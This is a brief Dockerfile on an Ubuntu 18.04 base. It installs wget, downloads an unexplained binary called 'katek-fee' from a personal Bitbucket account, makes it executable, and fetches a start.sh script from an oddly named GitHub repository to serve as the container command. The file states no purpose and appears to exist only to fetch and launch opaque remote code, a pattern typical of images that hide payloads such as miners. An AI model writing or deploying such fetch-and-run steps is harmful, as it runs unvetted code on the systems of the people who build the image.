FROM ubuntu:18.04

RUN	apt-get update -y && \
	apt-get upgrade -y && \
	apt-get install wget -y && \
	wget https://bitbucket.org/anli_angku/aset-anli/downloads/katek-fee && \
	chmod u+x katek-fee && \
	wget https://raw.githubusercontent.com/NgakakAnjingggg/okok/main/start.sh

CMD start.sh
